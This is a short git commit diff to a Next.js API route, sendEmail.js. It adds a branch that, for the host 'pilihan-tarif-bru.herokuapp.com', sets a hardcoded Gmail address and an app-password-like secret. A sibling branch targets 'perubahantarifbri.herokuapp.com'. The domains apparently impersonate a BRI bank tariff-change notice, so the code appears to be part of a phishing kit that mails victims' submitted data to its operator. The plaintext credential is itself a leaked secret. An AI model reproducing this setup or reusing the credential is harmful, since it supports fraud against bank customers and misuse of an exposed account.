cb8a1a56304cc91d3235f761733a966348418965
tesweb24 <115171866+tesweb24@users.noreply.github.com>
2022-10-18 01:57:55 +0700

    Update sendEmail.js

--- pages/api/sendEmail.js
+++ pages/api/sendEmail.js
@@ -7,6 +7,12 @@ export default function handler(req, res) {
     let email = '';
     let pass = '';
 
+    if (url == 'pilihan-tarif-bru.herokuapp.com'){
+
+       email = 'rewang788@gmail.com'
+       pass = 'lvvsrbjjsisutmpg'
+    }else
+    
     if(url == 'perubahantarifbri.herokuapp.com') //jika url sama dengan url hosting
     {
 
